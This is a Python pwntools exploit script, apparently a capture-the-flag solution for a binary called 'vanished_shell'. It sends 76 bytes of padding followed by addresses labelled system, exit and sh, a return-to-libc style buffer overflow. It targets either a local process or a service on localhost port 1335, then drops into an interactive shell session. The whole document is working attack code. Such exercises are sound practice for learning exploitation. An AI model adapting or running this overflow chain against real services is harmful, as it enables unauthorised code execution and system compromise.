#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import argparse
from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("-m", "--mode", required=True, choices=["d", "debug", "r", "remote"])
args = parser.parse_args()

context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"

if args.mode in ["d", "debug"]:
    atk = process('./vanished_shell')
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    chall = ELF('./vanished_shell', checksec=True)
    payload_system = p32(0xaddf00d5)
    payload_exit = p32(0xfeedd045)
    payload_sh = p32(0xdead8bed)
else:
    atk = remote('localhost', 1335)
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    chall = None
    payload_system = p32(0xbadf00d)
    payload_exit = p32(0xfaceb00c)
    payload_sh = p32(0xdeadfeed)

# Payloads
offset = b"A" * 76
# payload_win = p32(0xcafebabe)

atk.recvuntil(b"What do you want to solve?")
# atk.sendline(offset + payload_win)
atk.sendline(offset + payload_system + payload_exit + payload_sh)

atk.interactive()
